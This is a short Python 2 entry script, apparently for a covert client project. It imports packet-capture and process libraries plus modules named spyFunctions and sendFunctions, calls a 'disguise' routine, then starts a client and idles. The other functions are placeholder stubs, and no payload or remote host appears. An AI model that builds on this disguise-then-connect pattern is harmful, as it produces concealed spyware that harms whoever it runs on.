import socket
from struct import *
import pcapy
import sys
import psutil
import threading
import config
import spyFunctions
import sendFunctions

running = True

def main(argv):
	arguments = checkArgs(argv)
	if (arguments != False):
		setConfig(arguments)
		spyFunctions.disguise()
		sendFunctions.startClient()
		try: 
			while(True):
				pass
		except (KeyboardInterrupt, SystemExit):
			running = False
			sys.exit()


def checkArgs(argv):
	if (len(argv) > 1):
		return True
	return True

def usage():
	print "usage"


def setConfig(args):
	print "setConfig"


if __name__ == "__main__":
	main(sys.argv)